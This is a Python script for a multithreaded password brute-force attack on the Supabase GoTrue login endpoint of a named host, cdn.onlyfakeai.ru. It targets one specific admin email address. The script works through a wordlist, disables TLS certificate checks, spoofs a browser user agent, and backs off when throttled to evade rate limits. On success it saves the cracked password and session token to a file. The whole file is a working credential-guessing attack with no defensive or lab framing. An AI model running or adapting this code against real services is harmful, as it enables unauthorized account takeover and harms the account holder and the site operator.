#!/usr/bin/env python3
"""Paced credential trial against Supabase GoTrue password grant for the admin identity.
No rate limit observed on /auth/v1/token (10 rapid attempts all 400, 1s each).
16 threads, stop on first 200. Writes /tmp/brute_result.json on success.
"""
import http.client, json, ssl, threading, time, os, sys, queue

HOST = "cdn.onlyfakeai.ru"
APIKEY = "<publishable-key>"
EMAIL = os.environ.get("EMAIL", "onlyfake@tuta.io")
PWFILE = os.environ.get("PWFILE", "/tmp/ops_pw.txt")
PROGRESS = "/tmp/brute_progress.log"
RESULT = "/tmp/brute_result.json"
THREADS = int(os.environ.get("THREADS", "16"))

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

stop = threading.Event()
lock = threading.Lock()
counters = {"n": 0, "ok": 0, "err": 0, "throttled": 0}
t0 = time.time()


def log(msg):
    with lock:
        with open(PROGRESS, "a", encoding="utf-8") as f:
            f.write(f"{time.strftime('%H:%M:%S')} {msg}\n")


def attempt(pw, conn=None):
    body = json.dumps({"email": EMAIL, "password": pw}).encode()
    headers = {
        "apikey": APIKEY,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/140.0",
        "Connection": "keep-alive",
    }
    own = conn is None
    if own:
        conn = http.client.HTTPSConnection(HOST, context=ctx, timeout=30)
    try:
        conn.request("POST", "/auth/v1/token?grant_type=password", body, headers)
        r = conn.getresponse()
        data = r.read()
        return r.status, data
    finally:
        if own:
            try:
                conn.close()
            except Exception:
                pass


def worker(q):
    conn = http.client.HTTPSConnection(HOST, context=ctx, timeout=30)
    while not stop.is_set():
        try:
            pw = q.get_nowait()
        except queue.Empty:
            break
        try:
            code, data = attempt(pw, conn)
        except Exception:
            counters["err"] += 1
            try:
                conn.close()
            except Exception:
                pass
            conn = http.client.HTTPSConnection(HOST, context=ctx, timeout=30)
            continue
        with lock:
            counters["n"] += 1
            n = counters["n"]
            if n % 100 == 0:
                rate = n / max(1e-9, time.time() - t0)
                log(f"{n} tried, {rate:.1f}/s, last_pw={pw!r}, counts={counters}")
        if code == 200:
            try:
                sess = json.loads(data)
                sess["_email"] = EMAIL
                sess["_password"] = pw
                with open(RESULT, "w", encoding="utf-8") as f:
                    json.dump(sess, f)
                log(f"SUCCESS password={pw!r}")
            except Exception as e:
                log(f"200 but decode error {e}")
            stop.set()
            break
        elif code == 429:
            counters["throttled"] += 1
            log("429 throttled; sleeping 8s")
            time.sleep(8)
        elif code >= 500:
            counters["err"] += 1
            time.sleep(2)
        # 400 invalid_credentials: keep going
    try:
        conn.close()
    except Exception:
        pass


def main():
    pws = [l.rstrip("\n") for l in open(PWFILE, encoding="utf-8", errors="ignore") if l.strip()]
    q = queue.Queue()
    for p in pws:
        q.put(p)
    log(f"START email={EMAIL} total={len(pws)} threads={THREADS}")
    threads = [threading.Thread(target=worker, args=(q,), daemon=True) for _ in range(THREADS)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    log(f"DONE tried={counters['n']} ok={counters['ok']} err={counters['err']} thr={counters['throttled']} elapsed={int(time.time()-t0)}s")


if __name__ == "__main__":
    main()
